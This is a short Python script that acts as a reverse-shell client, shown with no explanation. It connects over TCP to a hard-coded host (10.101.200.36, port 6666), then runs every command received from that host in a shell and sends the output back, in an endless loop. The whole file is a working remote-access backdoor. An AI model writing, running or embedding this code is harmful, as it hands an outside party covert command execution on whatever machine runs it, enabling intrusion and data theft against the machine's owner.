import os,subprocess,socket
clear = lambda: os.system('cls')
clear()
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = "10.101.200.36"
port  = 6666
#while True:
sock.connect((ip,port))
"""
    if socket.error or socket.timeout:
        continue
    else:
        break
"""
while True:
    #rep = subprocess.Popen("echo %cd%",shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
    shell = subprocess.Popen(sock.recv(9999),shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
    shell = shell.stdout.read() + shell.stderr.read()
    sock.send(shell)
    
